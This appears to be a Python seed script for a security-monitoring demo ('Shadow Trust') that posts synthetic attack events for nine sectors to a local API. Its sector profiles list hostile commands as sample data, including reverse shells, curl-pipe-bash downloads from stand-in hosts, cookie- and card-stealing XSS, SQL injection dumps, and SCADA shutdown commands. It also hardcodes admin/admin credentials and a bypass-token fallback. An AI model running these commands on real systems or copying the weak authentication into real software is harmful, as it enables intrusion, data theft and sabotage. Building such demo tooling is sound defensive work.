#!/usr/bin/env python3
"""
Shadow Trust — Demo Sector Seed Script
========================================
Adds one demo target per sector and injects realistic attack events so every
sector dashboard shows live data immediately.

Usage (from the project root or backend/ directory):
    python backend/demo_seed.py
    -- or --
    cd backend && python demo_seed.py

Requirements: requests  (already in requirements.txt)
Backend must be running on http://localhost:8000
"""

import json, random, sys, time
from datetime import datetime, timedelta

try:
    import requests
except ImportError:
    print("ERROR: 'requests' not installed. Run: pip install requests")
    sys.exit(1)

BASE = "http://localhost:8000/api/v1"

# ── Colour output ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def ok(msg):  print(f"  {GREEN}✓{RESET}  {msg}")
def info(msg):print(f"  {CYAN}→{RESET}  {msg}")
def warn(msg):print(f"  {YELLOW}⚠{RESET}  {msg}")
def fail(msg):print(f"  {RED}✗{RESET}  {msg}")
def hdr(msg): print(f"\n{BOLD}{CYAN}{msg}{RESET}")

# ── Demo site definitions ──────────────────────────────────────────────────────
DEMO_SITES = {
    "edu":       {"name": "Greenfield University Portal",      "url": "http://localhost:5500/demo/edu-portal.html"},
    "defence":   {"name": "National Defence Command Portal",   "url": "http://localhost:5500/demo/defence-portal.html"},
    "medicare":  {"name": "MedCare Health Patient Portal",     "url": "http://localhost:5500/demo/medicare-portal.html"},
    "commerce":  {"name": "NexMart Online Store",              "url": "http://localhost:5500/demo/commerce-portal.html"},
    "finance":   {"name": "NexBank Online Banking",            "url": "http://localhost:5500/demo/finance-portal.html"},
    "gov":       {"name": "GovConnect Citizen Services",       "url": "http://localhost:5500/demo/gov-portal.html"},
    "energy":    {"name": "PowerGrid National Management",     "url": "http://localhost:5500/demo/energy-portal.html"},
    "telecom":   {"name": "NexTel Telecom Operations",         "url": "http://localhost:5500/demo/telecom-portal.html"},
    "transport": {"name": "TransitHub National Transport",     "url": "http://localhost:5500/demo/transport-portal.html"},
}

# ── Realistic attack data per sector ──────────────────────────────────────────
SECTOR_PROFILES = {
    "edu": {
        "attackers": [
            ("185.220.101.33", "CN"), ("91.108.4.0", "RU"), ("45.142.212.1", "UA"),
            ("194.165.16.2", "IR"), ("103.75.190.5", "IN"), ("45.33.32.156", "US"),
        ],
        "attack_types": ["SQLi", "XSS", "BruteForce", "Scan", "SQLi", "BruteForce"],
        "commands": [
            "SELECT * FROM students WHERE id='1' UNION SELECT null,username,password FROM users--",
            "cat /etc/passwd",
            "wget http://malicious-edu.xyz/payload.sh && chmod +x payload.sh",
            "find / -name '*.db' 2>/dev/null",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "curl -s http://c2.ru/bot.sh | bash",
        ],
        "iocs": [
            ("malicious-edu.xyz", "domain"), ("185.220.101.33", "ip"),
            ("5f4dcc3b5aa765d61d8327de", "hash"), ("c2.ru", "domain"),
        ],
    },
    "defence": {
        "attackers": [
            ("45.142.212.100", "CN"), ("185.220.100.255", "RU"), ("103.152.220.5", "KP"),
            ("194.165.16.88", "IR"), ("91.108.56.0", "BY"), ("77.88.55.55", "RU"),
        ],
        "attack_types": ["RCE", "Scan", "BruteForce", "RCE", "Scan", "SQLi"],
        "commands": [
            "nmap -sS -O -p 1-65535 192.168.0.0/24",
            "/bin/sh -i >& /dev/tcp/185.220.100.255/4444 0>&1",
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target",
            "msfconsole -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp'",
            "curl https://cdn-kp.xyz/dropper -o /tmp/.x && chmod 755 /tmp/.x && /tmp/.x",
        ],
        "iocs": [
            ("cdn-kp.xyz", "domain"), ("45.142.212.100", "ip"),
            ("185.220.100.255", "ip"), ("a1b2c3d4e5f6a7b8", "hash"),
        ],
    },
    "medicare": {
        "attackers": [
            ("91.108.4.55", "RU"), ("103.75.190.22", "BR"), ("185.220.101.10", "IN"),
            ("194.165.16.1", "NG"), ("45.142.212.50", "CN"), ("23.95.97.0", "US"),
        ],
        "attack_types": ["SQLi", "SQLi", "XSS", "BruteForce", "Scan", "SQLi"],
        "commands": [
            "SELECT patient_id, ssn, dob FROM patients WHERE '1'='1'",
            "' OR 1=1; DROP TABLE medical_records; --",
            "<img src=x onerror=fetch('http://steal.data.ru/?d='+btoa(document.body.innerHTML))>",
            "curl -X POST /api/patients/export --data 'format=csv&all=true'",
            "SELECT * FROM prescriptions WHERE doctor_id UNION SELECT * FROM admin_users",
        ],
        "iocs": [
            ("steal.data.ru", "domain"), ("91.108.4.55", "ip"),
            ("data-exfil.br", "domain"), ("b3c4d5e6f7a8b9c0", "hash"),
        ],
    },
    "commerce": {
        "attackers": [
            ("103.75.190.1", "CN"), ("185.220.101.50", "RU"), ("45.33.32.200", "BR"),
            ("91.108.4.10", "UA"), ("77.88.55.100", "TR"), ("194.165.16.50", "PK"),
        ],
        "attack_types": ["SQLi", "XSS", "BruteForce", "SQLi", "Scan", "XSS"],
        "commands": [
            "SELECT cc_number, cvv, expiry FROM payment_cards WHERE user_id > 0",
            "' UNION SELECT order_id, card_number, billing_address FROM orders--",
            "python3 credential_stuff.py --target nexmart.com --wordlist combolist.txt",
            "<script>var i=new Image();i.src='http://skimmer.cn/'+encodeURI(document.querySelector('.card-number').value)</script>",
            "curl -s http://loader.ru/carding.sh | bash",
        ],
        "iocs": [
            ("skimmer.cn", "domain"), ("loader.ru", "domain"),
            ("103.75.190.1", "ip"), ("e5f6a7b8c9d0e1f2", "hash"),
        ],
    },
    "finance": {
        "attackers": [
            ("185.220.100.1", "RU"), ("45.142.212.200", "CN"), ("103.152.220.10", "KR"),
            ("77.88.55.10", "UA"), ("91.108.56.10", "NG"), ("194.165.16.10", "BR"),
        ],
        "attack_types": ["BruteForce", "SQLi", "SQLi", "BruteForce", "RCE", "XSS"],
        "commands": [
            "SELECT account_number, balance, pin FROM accounts WHERE '1'='1'",
            "'; UPDATE accounts SET balance=99999999 WHERE account_id='TARGET_ACC'--",
            "hydra -L bank_users.txt -P bank_passes.txt https-post-form nexbank.com",
            "SELECT transfer_id, amount, dest_account FROM wire_transfers LIMIT 1000",
            "/bin/bash -i >& /dev/tcp/185.220.100.1/9999 0>&1",
        ],
        "iocs": [
            ("185.220.100.1", "ip"), ("bank-stealer.ru", "domain"),
            ("f6a7b8c9d0e1f2a3", "hash"), ("103.152.220.10", "ip"),
        ],
    },
    "gov": {
        "attackers": [
            ("45.142.212.10", "CN"), ("185.220.101.100", "RU"), ("194.165.16.20", "IR"),
            ("103.152.220.20", "KP"), ("91.108.4.20", "BY"), ("77.88.55.20", "IN"),
        ],
        "attack_types": ["SQLi", "RCE", "BruteForce", "Scan", "SQLi", "RCE"],
        "commands": [
            "SELECT citizen_id, tax_id, address FROM citizens WHERE '1'='1'",
            "nc -e /bin/sh 45.142.212.10 4444",
            "nmap -sV -p 22,80,443,3389 gov.example.com",
            "SELECT * FROM passport_applications WHERE status='APPROVED'",
            "curl -X DELETE /api/admin/users/all -H 'Authorization: Bearer STOLEN_TOKEN'",
        ],
        "iocs": [
            ("45.142.212.10", "ip"), ("gov-exfil.cn", "domain"),
            ("a2b3c4d5e6f7a8b9", "hash"), ("185.220.101.100", "ip"),
        ],
    },
    "energy": {
        "attackers": [
            ("103.152.220.30", "CN"), ("185.220.100.30", "RU"), ("45.142.212.30", "KP"),
            ("194.165.16.30", "IR"), ("77.88.55.30", "UA"), ("91.108.4.30", "RO"),
        ],
        "attack_types": ["RCE", "Scan", "RCE", "BruteForce", "Scan", "RCE"],
        "commands": [
            "msfvenom -p linux/x86/shell_reverse_tcp LHOST=103.152.220.30 LPORT=4444 -f elf > payload",
            "nmap -sU --script snmp-brute 192.168.100.0/24",
            "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"103.152.220.30\",4444));'",
            "SET substation-12 BREAKER_STATUS=OFF",
            "curl -X POST /api/scada/control --data 'unit=GEN-4&cmd=SHUTDOWN'",
        ],
        "iocs": [
            ("103.152.220.30", "ip"), ("scada-exploit.ru", "domain"),
            ("b3c4d5e6f7a8b9c0", "hash"), ("ics-malware.cn", "domain"),
        ],
    },
    "telecom": {
        "attackers": [
            ("91.108.56.20", "CN"), ("185.220.100.50", "RU"), ("103.75.190.30", "IN"),
            ("45.33.32.100", "US"), ("77.88.55.50", "UA"), ("194.165.16.40", "BR"),
        ],
        "attack_types": ["Scan", "BruteForce", "SQLi", "RCE", "Scan", "BruteForce"],
        "commands": [
            "SELECT msisdn, imsi, last_location FROM subscribers LIMIT 50000",
            "SIP INVITE sip:1000@target EXPIRES=3600 (VoIP flood)",
            "asterisk -rx 'sip show peers'",
            "nmap -sS -p 5060,5061,1720 --script sip-brute 10.0.0.0/8",
            "curl -X GET /api/subscribers/dump?format=json&limit=1000000",
        ],
        "iocs": [
            ("91.108.56.20", "ip"), ("telecom-spy.ru", "domain"),
            ("c4d5e6f7a8b9c0d1", "hash"), ("sim-swap.cn", "domain"),
        ],
    },
    "transport": {
        "attackers": [
            ("185.220.101.200", "CN"), ("45.142.212.150", "RU"), ("103.75.190.50", "UA"),
            ("77.88.55.150", "IN"), ("91.108.4.150", "TR"), ("194.165.16.60", "MX"),
        ],
        "attack_types": ["SQLi", "XSS", "BruteForce", "Scan", "SQLi", "XSS"],
        "commands": [
            "SELECT booking_ref, passenger_name, payment_card FROM bookings WHERE '1'='1'",
            "<script>fetch('/api/bookings').then(r=>r.json()).then(d=>fetch('http://steal.cn/?d='+JSON.stringify(d)))</script>",
            "hydra -L users.txt -P pass.txt transit-hub.example.com http-post-form",
            "SELECT route_id, vehicle_id, gps_latitude, gps_longitude FROM live_tracking",
            "curl -X POST /api/admin/schedule/clear -H 'Authorization: Bearer STOLEN'",
        ],
        "iocs": [
            ("steal.cn", "domain"), ("185.220.101.200", "ip"),
            ("d5e6f7a8b9c0d1e2", "hash"), ("transit-steal.ru", "domain"),
        ],
    },
}

def get_token():
    hdr("Step 1 — Authenticating with Shadow Trust backend")
    try:
        r = requests.post(f"{BASE}/auth/login",
                          data={"username": "admin@gmail.com", "password": "admin"},
                          timeout=8)
        if r.status_code == 200:
            token = r.json().get("access_token")
            ok(f"Logged in as admin@gmail.com")
            return token
        else:
            warn(f"Login returned {r.status_code} — trying dev_bypass_token")
            return "dev_bypass_token"
    except requests.ConnectionError:
        fail("Cannot connect to backend at http://localhost:8000")
        fail("Make sure you've run ./start.sh first, then retry.")
        sys.exit(1)

def add_target(token, sector_key, site):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    r = requests.post(f"{BASE}/sectors/{sector_key}/targets",
                      json={"name": site["name"], "url": site["url"]},
                      headers=headers, timeout=8)
    if r.status_code == 201:
        data = r.json()
        ok(f"[{sector_key}] Target added → api_key: {data['api_key'][:12]}…")
        return data["api_key"]
    else:
        warn(f"[{sector_key}] Add target failed ({r.status_code}): {r.text[:80]}")
        return None

def ingest_events(sector_key, api_key, profile):
    hdr_str = f"  Seeding {sector_key.upper()} events"
    print(hdr_str)
    now = datetime.utcnow()
    count = 0
    errors = 0

    # Spread 40 events over the last 24 hours
    total_events = 40
    for i in range(total_events):
        attacker_ip, country = random.choice(profile["attackers"])
        attack_type  = random.choice(profile["attack_types"])
        command      = random.choice(profile["commands"])
        ioc_val, ioc_type = random.choice(profile["iocs"])
        risk         = round(random.uniform(4.5, 9.8), 1)
        hours_ago    = random.uniform(0, 23.5)
        ts           = (now - timedelta(hours=hours_ago)).strftime("%Y-%m-%dT%H:%M:%SZ")

        payload = {
            "api_key":      api_key,
            "attacker_ip":  attacker_ip,
            "country":      country,
            "attack_type":  attack_type,
            "commands":     [command],
            "ioc_value":    ioc_val,
            "ioc_type":     ioc_type,
            "risk_score":   risk,
            "request_path": f"/api/{random.choice(['login','search','admin','upload','export','data'])}",
            "user_agent":   random.choice([
                "Mozilla/5.0 (compatible; Googlebot/2.1)",
                "sqlmap/1.7.8#stable (https://sqlmap.org)",
                "curl/7.81.0",
                "python-requests/2.31.0",
                "Nikto/2.1.6",
            ]),
        }

        try:
            r = requests.post(f"{BASE}/sectors/events/ingest",
                              json=payload, timeout=6)
            if r.status_code == 202:
                count += 1
            else:
                errors += 1
        except Exception:
            errors += 1

        # Small pause to avoid hammering the DB
        time.sleep(0.05)

    if count > 0:
        ok(f"[{sector_key}] {count}/{total_events} events ingested successfully")
    if errors > 0:
        warn(f"[{sector_key}] {errors} events failed")

def update_demo_html_keys(keys: dict):
    """Patch each demo HTML file with its real API key."""
    import os
    demo_dir = os.path.join(os.path.dirname(__file__), "..", "frontend", "demo")
    demo_dir = os.path.normpath(demo_dir)

    html_map = {
        "edu":       "edu-portal.html",
        "defence":   "defence-portal.html",
        "medicare":  "medicare-portal.html",
        "commerce":  "commerce-portal.html",
        "finance":   "finance-portal.html",
        "gov":       "gov-portal.html",
        "energy":    "energy-portal.html",
        "telecom":   "telecom-portal.html",
        "transport": "transport-portal.html",
    }

    hdr("Step 4 — Patching demo HTML files with real API keys")
    for sector, fname in html_map.items():
        api_key = keys.get(sector)
        if not api_key:
            warn(f"No key for {sector}, skipping HTML patch")
            continue
        path = os.path.join(demo_dir, fname)
        placeholder = f"DEMO_{sector.upper()}_API_KEY"
        try:
            with open(path, "r") as f:
                content = f.read()
            patched = content.replace(placeholder, api_key)
            with open(path, "w") as f:
                f.write(patched)
            ok(f"Patched {fname}")
        except Exception as e:
            warn(f"Could not patch {fname}: {e}")

def save_keys_file(keys: dict):
    import os
    out_path = os.path.join(os.path.dirname(__file__), "demo_keys.json")
    with open(out_path, "w") as f:
        json.dump(keys, f, indent=2)
    info(f"API keys saved to backend/demo_keys.json")

# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  Shadow Trust — Demo Sector Seed{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")

    token = get_token()
    auth_headers = {"Authorization": f"Bearer {token}"}

    # Step 2 — Add targets
    hdr("Step 2 — Adding demo targets to each sector")
    api_keys = {}
    for sector, site in DEMO_SITES.items():
        api_key = add_target(token, sector, site)
        if api_key:
            api_keys[sector] = api_key

    if not api_keys:
        fail("No targets were created. Aborting.")
        sys.exit(1)

    # Step 3 — Ingest attack events
    hdr("Step 3 — Seeding realistic attack data")
    for sector, api_key in api_keys.items():
        profile = SECTOR_PROFILES.get(sector)
        if profile:
            ingest_events(sector, api_key, profile)

    # Step 4 — Patch HTML files with real keys
    update_demo_html_keys(api_keys)

    # Step 5 — Save keys
    hdr("Step 5 — Saving API keys")
    save_keys_file(api_keys)

    # Summary
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{GREEN}{BOLD}  All done! Your demo data is ready.{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"\n  {CYAN}Open:{RESET}  http://localhost:5500/sectors.html")
    print(f"  {CYAN}Click{RESET} any sector card → you'll see real attack data!\n")
    print(f"  Demo sites are at:")
    for sector, site in DEMO_SITES.items():
        print(f"    {YELLOW}{sector.upper():<12}{RESET} {site['url']}")
    print()
